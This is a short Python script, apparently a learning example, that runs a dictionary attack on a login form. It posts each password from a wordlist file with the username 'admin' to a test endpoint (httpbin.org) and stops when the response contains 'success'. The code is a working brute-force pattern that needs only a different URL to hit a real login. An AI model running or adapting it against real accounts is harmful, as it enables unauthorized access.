import requests

url = "https://httpbin.org/post"   # test login endpoint
username = "admin"

with open("wordlist.txt","r") as file:

    for password in file:

        password = password.strip()

        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data)

        print("Trying password:", password)

        if "success" in response.text:
            print("Password found:", password)
            break